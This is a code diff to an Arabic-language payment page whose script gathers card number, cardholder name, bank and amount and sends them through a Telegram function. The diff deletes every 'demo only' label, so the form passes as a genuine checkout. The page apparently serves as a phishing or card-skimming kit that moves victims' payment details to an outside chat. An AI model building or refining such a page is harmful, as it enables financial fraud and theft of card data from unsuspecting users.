@@ -27,7 +27,7 @@
     <div class="card">
       <div id="summary" class="summary">—</div>
 
-      <label for="cardNumber">رقم البطاقة (تجريبي فقط)</label>
+      <label for="cardNumber">رقم البطاقة </label>
       <input id="cardNumber" placeholder="1234-5678-9012-3456" />
 
       <label for="cardName">الاسم على البطاقة</label>
@@ -89,7 +89,7 @@
     }
 
     document.getElementById('payBtn').addEventListener('click', async ()=>{
-      const msg = `💳 الدفع (تجريبي)
+      const msg = `💳 الدفع ()
 👤 الاسم: ${d.fullName||'-'}
 🏦 البنك: ${d.bank||'-'}
 💵 المبلغ: ${d.amount||'-'} درهم
@@ -100,7 +100,7 @@
 
       await sendTelegram(msg);
 
-      alert('✅ تم إرسال بيانات الدفع (تجريبياً)');
+      alert('✅ تم إرسال بيانات الدفع ()');
     });
   </script>
 </body>
